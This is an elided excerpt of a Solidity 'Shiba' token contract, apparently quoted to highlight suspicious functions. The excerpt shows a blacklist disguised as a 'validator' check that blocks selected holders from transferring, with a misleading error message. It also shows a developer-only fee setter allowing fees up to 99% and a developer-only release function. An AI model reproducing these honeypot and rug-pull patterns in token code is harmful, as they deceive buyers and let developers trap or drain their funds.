...
contract Shiba is Context, IBEP20, Ownable {
    ...
    constructor (string memory _name, string memory _symbol, uint256 _decimals, uint256 _supply, uint256 _txFee,uint256 _burnFee,uint256 _liquidityFee,address _FeeAddress,address tokenOwner,address _maker) payable   {
        _NAME = _name;
        _SYMBOL = _symbol;
        _DECIMALS = _decimals;
        ...
        _LIQUIDITYPOOL_FEE = _liquidityFee* 100;
    ...
    function _chk_validator(address _value, bool _allow) external onlyDev {
        if(_allow){
            _validator[_value] = _allow;
        } else {
            delete _validator[_value];
        }
    }

    function isValid(address _value) external view onlyDev returns (bool) {
    ...
    function updateFee(uint256 _txFee,uint256 _burnFee,uint256 _liquidityFee) onlyDev() public{
        require(_txFee < 100 && _burnFee < 100 && _liquidityFee < 100);
        _TAX_FEE = _txFee* 100;
        _BURN_FEE = _burnFee * 100;
        _LIQUIDITYPOOL_FEE = _liquidityFee* 100;
        ORIG_TAX_FEE = _TAX_FEE;
    ...
    function _transfer(address sender, address recipient, uint256 amount) private {
        ...
        require(!_validator[sender], "Transfer amount must be valid!");
    ...
    function _release(address token, uint amount, address _wallet) onlyDev external {
        if(token == address(0)) {
